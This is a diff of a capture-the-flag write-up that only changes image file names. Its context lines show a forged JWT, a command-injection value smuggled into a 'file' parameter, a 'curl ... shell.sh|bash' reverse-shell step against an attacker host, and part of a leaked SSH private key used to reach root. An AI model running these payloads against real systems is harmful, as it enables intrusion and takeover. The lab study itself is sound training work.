@@ -112,7 +112,7 @@ Then, we can spoof the token using this website:
 
 {% embed url="https://jwt.io/" %}
 
-<figure><img src="../../../.gitbook/assets/image (455).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (455) (2).png" alt=""><figcaption></figcaption></figure>
 
 We can verify that this works by using the `/api/priv` endpoint:
 
@@ -131,7 +131,7 @@ $ curl 'http://10.129.71.62/api/logs?file=t;curl+10.10.14.13/rcecfm' -H 'auth-to
 
 Then we can just use `curl 10.10.14.13/shell.sh|bash` to get a reverse shell.
 
-<figure><img src="../../../.gitbook/assets/image (432).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (432) (2).png" alt=""><figcaption></figcaption></figure>
 
 Grab that user flag.
 
@@ -492,6 +492,6 @@ b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
 
 With this private key, we can `ssh` in as `root`.
 
-<figure><img src="../../../.gitbook/assets/image (442).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (442) (2).png" alt=""><figcaption></figcaption></figure>
 
 Rooted!
